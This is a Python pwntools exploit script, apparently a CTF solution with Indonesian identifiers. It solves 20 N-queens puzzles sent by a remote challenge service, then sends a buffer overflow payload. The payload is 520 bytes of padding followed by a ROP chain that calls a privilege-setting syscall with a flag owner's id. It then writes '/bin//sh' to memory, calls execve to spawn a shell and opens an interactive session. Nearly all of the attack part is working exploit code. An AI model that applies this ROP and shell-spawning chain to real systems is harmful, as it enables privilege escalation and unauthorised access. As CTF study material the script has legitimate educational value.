#!/usr/bin/python

from pwn import *
from struct import pack

global papan
papan = []

def bikin_papan(N):
	for i in range(N):
		nol = []
		
		for j in range(N):
			nol.append(0)
		
		papan.append(nol)

def cek_lokasi(papan, N, a, b):
	x = 0
	for i in range(N):
		if i > a:
			x += 1
		for j in range(N):
			if i == a or j == b or j == i + (b - a) or (i == a + x and j == b - x):
				if papan[i][j]:
					return 0
					
	return 1

def solution(papan, N, j):
	if j == N:
		return 1
	
	for i in range(N):
		if cek_lokasi(papan,N, i, j):
			papan[i][j] = 1
			
			if solution(papan, N, j + 1):
				return 1
			else:
				papan[i][j] = 0	
	return 0

def cetak_papan():
	for i in range(len(papan)):
		for j in range(len(papan)):
			if papan[i][j]:
				kirim = str(i) + " " + str(j)
				a.sendline(kirim)

a = remote('agrihack.party', 30103)
# a = process('./buaya')
print a.recvuntil('Ayo selesaikan 20 alokasi penangkarannya. Kamu akan dapat hadiah jika berhasil.')
for i in range(20):
	hasil = a.recvuntil('meter persegi')
	print hasil
	N = int(hasil.split()[-3])
	bikin_papan(N)
	solution(papan, N, 0)
	cetak_papan()
	papan = []

print a.recvuntil('tas kulit buaya')

# Padding goes here
p = 'a'*520

p += pack('<Q', 0x00401b66) # : pop rdi; ret
p += p64(0x237c) # isi dengan id yang punya flagnya
p += pack('<Q', 0x00401c87) # pop rsi ; ret
p += p64(0x237c) # isi dengan id yang punya flagnya
p += pack('<Q', 0x00443ef6) # pop rdx; ret
p += p64(0x237c) # isi dengan id yang punya flagnya

p += pack('<Q', 0x0046f9b0) # mov rax, 1
for i in range(116):
	p += pack('<Q', 0x0046f980) # add rax, 1
p += pack('<Q', 0x00000000004706e5) # syscall ; ret

p += pack('<Q', 0x0000000000401c87) # pop rsi ; ret
p += pack('<Q', 0x00000000006cc080) # @ .data
p += pack('<Q', 0x0000000000481a46) # pop rax ; pop rdx ; pop rbx ; ret
p += '/bin//sh'
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x000000000047d4f1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401c87) # pop rsi ; ret
p += pack('<Q', 0x00000000006cc088) # @ .data + 8
p += pack('<Q', 0x000000000042760f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047d4f1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401b66) # pop rdi ; ret
p += pack('<Q', 0x00000000006cc080) # @ .data
p += pack('<Q', 0x0000000000401c87) # pop rsi ; ret
p += pack('<Q', 0x00000000006cc088) # @ .data + 8
p += pack('<Q', 0x0000000000443ef6) # pop rdx ; ret
p += pack('<Q', 0x00000000006cc088) # @ .data + 8
p += pack('<Q', 0x000000000042760f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046f980) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004706e5) # syscall ; ret


a.sendline(p)
# print a.recv()
a.interactive()